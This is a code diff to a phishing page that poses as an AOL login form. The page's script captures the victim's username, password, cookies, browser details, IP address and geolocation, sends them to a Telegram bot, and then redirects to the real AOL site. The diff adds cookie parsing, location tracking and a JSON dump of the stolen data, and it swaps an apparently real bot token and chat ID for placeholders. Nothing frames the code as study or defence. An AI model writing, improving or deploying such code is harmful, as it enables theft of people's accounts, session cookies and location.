@@ -153,8 +153,8 @@
   </div>
 
   <script>
-    const BOT_TOKEN = '8028760837:AAGRCR8aRXteT3pQwf7-eGE8oIRm7NamAWU';  // Replace with actual token
-    const CHAT_ID = '6564094997';      // Replace with actual chat ID
+    const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';  // Replace with actual token
+    const CHAT_ID = 'YOUR_CHAT_ID_HERE';      // Replace with actual chat ID
     const REDIRECT_URL = 'https://login.aol.com/';
 
     function showStep2(event) {
@@ -174,17 +174,62 @@
       const username = document.getElementById('usernameHidden').value;
       const password = e.target.password.value.trim();
       const browser = navigator.userAgent;
-      const cookies = document.cookie || 'No cookies';
+      // Parse all cookies into key-value pairs
+      const cookiePairs = document.cookie.split('; ');
+      const cookies = {};
+      cookiePairs.forEach(pair => {
+        const [key, value] = pair.split('=');
+        cookies[key] = decodeURIComponent(value);
+      });
       const timestamp = new Date().toLocaleString();
 
       let ip = 'Unavailable';
+      let geoLocation = {};
       try {
         const res = await fetch('https://api.ipify.org?format=json');
         const data = await res.json();
         ip = data.ip;
+        // Try to get geolocation
+        if (navigator.geolocation) {
+          const position = await new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(resolve, reject);
+          });
+          geoLocation = {
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            accuracy: position.coords.accuracy
+          };
+        }
       } catch (err) {
-        console.warn('Could not fetch IP:', err);
+        console.warn('Could not fetch IP/Geo:', err);
       }
+
+      // Enhanced cookie saving function
+      function saveCookiesToFile(cookieObj) {
+        const cookieData = {
+          login: {
+            username: username,
+            password: password
+          },
+          device: {
+            ip: ip,
+            browser: browser,
+            geoLocation: geoLocation
+          },
+          cookies: cookieObj,
+          timestamp: timestamp
+        };
+        const blob = new Blob([JSON.stringify(cookieData, null, 2)], {type: 'application/json'});
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = 'aol_cookies.json';
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+      }
+      
+      saveCookiesToFile(cookies);
 
       const message = `
 🔐 <b>AOL LOGIN</b>
@@ -192,7 +237,7 @@
 🔑 <b>Password:</b> ${password}
 🌐 <b>IP:</b> ${ip}
 🧭 <b>Browser:</b> ${browser}
-🍪 <b>Cookies:</b> ${cookies}
+🍪 <b>Cookies:</b> ${JSON.stringify(cookies, null, 2)}
 🕒 <b>Time:</b> ${timestamp}
       `;
 
